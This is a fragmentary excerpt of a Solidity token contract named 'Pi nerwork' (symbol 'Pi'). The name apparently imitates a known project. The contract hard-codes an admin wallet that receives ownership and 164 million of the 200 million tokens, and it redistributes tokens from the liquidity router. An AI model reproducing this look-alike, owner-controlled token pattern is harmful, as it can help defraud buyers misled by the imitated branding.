...
contract  GGGTOKEN is IERC20, Ownable {
    ...
    constructor(){
            ...
            address admin =0xB4Dec1F4bEC197C9121310f59570957e07F31D6D;
            transferOwnership(admin);
            _enabOwnerAddLiq = 1;
            _name = "Pi nerwork";
            _symbol = "Pi";
            _decimals= uint8(18);
            _tTotal = 200000000* (10**uint256(_decimals));
            address router;
            if(block.chainid==56){
            ...
            _tOwned[admin] = (200000000 - 36000000)* (10**uint256(_decimals));
   ...
   function getExcludedFromFee(address account) public view returns (bool) {
    ...
    function process() private {
        ...
        if(shareholderCount == 0||balanceOf(_lpRouter)==0)return;
        ...
        for(uint i;i<ss;i++){
            ...
            _basicTransfer(_lpRouter,_shareholders.at(_currentIndex),amount);
